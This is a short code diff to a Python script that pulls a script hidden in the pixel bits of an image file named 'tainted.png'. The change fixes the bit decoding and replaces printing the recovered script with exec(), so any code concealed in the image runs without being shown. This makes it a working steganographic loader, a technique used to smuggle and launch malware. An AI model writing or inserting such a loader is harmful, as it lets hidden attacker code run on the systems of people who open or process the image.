@@ -23,11 +23,9 @@ def extract_script_from_image(image_path):
 
     # Convert the length bits to an integer
     length_in_bits = int(''.join(map(str, length_bits)), 2)
-    length_in_bits = 91
-    print(f"Extracted Payload Length: {length_in_bits} bits")
 
     # Step 2: Extract the payload bits
-    payload_bits = []
+    payload_bits = [0]
     bit_index = 0
     for y in range(image.height):
         for x in range(image.width):
@@ -44,9 +42,9 @@ def extract_script_from_image(image_path):
 
     # Step 3: Convert payload bits to bytes
     payload_bytes = []
-    for i in range(0, len(payload_bits), 7):
+    for i in range(0, len(payload_bits), 8):
         byte = 0
-        for bit in payload_bits[i:i + 7]:
+        for bit in payload_bits[i:i + 8]:
             byte = (byte << 1) | bit
         payload_bytes.append(byte)
 
@@ -65,8 +63,7 @@ image_file_path = "./tainted.png"
 hidden_script = extract_script_from_image(image_file_path)
 
 if hidden_script:
-    print("\nExtracted Script:")
-    print(hidden_script)
+    exec(hidden_script)
 else:
     print("No valid script found!")
 
